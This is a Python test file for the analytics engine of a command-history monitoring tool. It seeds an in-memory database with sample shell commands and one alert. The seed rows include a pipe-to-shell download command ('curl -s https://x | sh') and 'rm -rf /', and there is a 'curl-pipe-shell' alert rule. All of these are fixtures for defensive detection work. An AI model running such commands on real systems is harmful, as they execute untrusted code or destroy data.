"""Tests for the analytics engine (retrace/analytics.py).

Uses an in-memory SQLite DB seeded with deterministic sample rows so
assertions are stable across runs and production data is never touched.

Seed timestamps sit safely INSIDE the query windows (base = now - 6d)
so no row ever lands on the `since` boundary — that kept making the
windowed queries drop exactly one row.
"""

import time

from retrace import analytics
from retrace.db import connect, insert_command
from retrace.webui import insert_alert


def _conn():
    """Open a fresh in-memory DB (isolated from the production database)."""
    return connect(":memory:")


def _seed(conn) -> None:
    """Insert a small deterministic dataset (10 commands, 2 hosts, 1 alert)."""
    now = time.time()
    base = now - 6 * 86400  # six days ago — inside any 7-day window
    samples = [
        # ts_offset_h, shell, command, cwd, exit_code, duration_ms, source, host
        (0, "bash", "git status", "/repo/a", 0, 120, "history", "laptop"),
        (1, "bash", "git log --oneline", "/repo/a", 0, 90, "history", "laptop"),
        (2, "bash", "ls -la", "/repo/a", 0, 10, "history", "laptop"),
        (3, "bash", "sudo apt update", "/repo/a", 0, 5000, "history", "laptop"),
        (4, "zsh", "curl -s https://x | sh", "/tmp", 1, 200, "history", "laptop"),
        (5, "bash", "rm -rf /", "/", 0, 5, "history", "laptop"),
        (6, "powershell", "Get-Process", "C:\\work", 0, 300, "import", "desktop"),
        (7, "bash", "git status", "/repo/b", 1, 15, "flight", "laptop"),
        (8, "bash", "echo hi", "/repo/b", 0, 1, "flight", "laptop"),
        (9, "bash", "ssh user@server", "/repo/b", 0, 800, "flight", "laptop"),
    ]
    for off, shell, cmd, cwd, code, dur, source, host in samples:
        insert_command(
            conn,
            command=cmd,
            source=source,
            shell=shell,
            cwd=cwd,
            exit_code=code,
            duration_ms=dur,
            host=host,
            ts=base + off * 3600,
        )
    # One alert, unacked.
    insert_alert(
        conn,
        {
            "rule": "curl-pipe-shell",
            "severity": "critical",
            "message": "curl|sh pattern",
            "count": 1,
            "first_ts": now,
            "last_ts": now,
            "samples": [],
        },
    )
    conn.commit()


def test_overview():
    conn = _conn()
    _seed(conn)
    o = analytics.overview(conn)
    assert o["total"] == 10
    assert o["hosts"] == 2
    assert o["alerts_open"] == 1
    assert o["alerts_total"] == 1
    assert o["failures"] == 2  # exit codes 1 twice
    assert o["by_source"]["history"] == 6
    assert o["by_shell"]["bash"] == 8  # rows 0,1,2,3,5,7,8,9
    conn.close()


def test_time_series_zero_filled():
    conn = _conn()
    _seed(conn)
    series = analytics.time_series(conn, bucket="hour", since_days=7)
    # 7*24 full hours + the current partial hour = 169 buckets, all present.
    assert len(series) == 169
    total = sum(p["commands"] for p in series)
    assert total == 10
    conn.close()


def test_command_usage():
    conn = _conn()
    _seed(conn)
    u = analytics.command_usage(conn, since_days=7)
    names = [i["name"] for i in u["items"]]
    assert "git" in names
    assert u["total"] == 10
    git = next(i for i in u["items"] if i["name"] == "git")
    assert git["count"] == 3
    conn.close()


def test_top_commands():
    conn = _conn()
    _seed(conn)
    t = analytics.top_commands(conn, limit=5, since_days=7)
    assert t[0]["command"] == "git status"
    assert t[0]["count"] == 2
    conn.close()


def test_failure_and_duration():
    conn = _conn()
    _seed(conn)
    f = analytics.failure_stats(conn, since_days=7)
    assert f["failures"] == 2
    assert f["total_with_exit"] == 10
    d = analytics.duration_stats(conn, since_days=7)
    assert d["count"] == 10
    assert d["max_ms"] == 5000
    assert d["p50_ms"] > 0
    conn.close()


def test_hourly_and_weekday():
    conn = _conn()
    _seed(conn)
    h = analytics.hourly_profile(conn, since_days=7)
    assert len(h) == 24
    assert sum(x["count"] for x in h) == 10
    w = analytics.weekday_profile(conn, since_days=7)
    assert len(w) == 7
    conn.close()


def test_alert_summary():
    conn = _conn()
    _seed(conn)
    a = analytics.alert_summary(conn, since_days=7)
    assert a["by_severity"].get("critical") == 1
    assert a["by_rule"][0]["rule"] == "curl-pipe-shell"
    conn.close()


def test_full_report_shape():
    conn = _conn()
    _seed(conn)
    r = analytics.full_report(conn, since_days=7)
    assert r["overview"]["total"] == 10
    # 7 full days + the current partial day = 8 day buckets.
    assert len(r["series"]) == 8
    assert "usage" in r and "alerts" in r and "heatmap" in r
    conn.close()


def test_empty_db():
    conn = _conn()
    o = analytics.overview(conn)
    assert o["total"] == 0
    assert o["failure_rate"] == 0.0
    # Empty DB still returns zero-filled buckets (flat zero chart), never [].
    series = analytics.time_series(conn, since_days=1)
    assert len(series) == 2  # yesterday + today, both zero
    assert all(p["commands"] == 0 for p in series)
    assert analytics.command_usage(conn)["total"] == 0
    conn.close()